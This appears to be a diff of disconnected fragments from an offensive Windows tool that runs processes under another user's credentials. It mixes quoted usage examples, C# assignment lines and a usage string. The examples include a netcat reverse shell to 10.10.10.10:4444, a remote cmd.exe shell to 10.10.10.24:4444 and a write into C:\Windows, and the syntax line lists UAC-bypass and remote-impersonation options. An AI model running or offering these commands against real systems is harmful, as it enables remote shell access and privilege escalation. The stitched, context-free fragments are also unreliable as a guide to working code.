@@ -1,0 +1,7 @@
+"Username adm1 -Password password1 ""cmd /c echo admin > C:\Windows\admin"" -LogonType 8 -RemoteImpersonation"
+"Username user1 -Password password1 -ProcessTimeout 0 -Command ""C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"""
+UserName = username;
+Username user1 -Password password1 -Command cmd.exe -Remote 10.10.10.24:4444
+username = password = cmd = domain = string.Empty;
+username = positionals[0];
+username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]
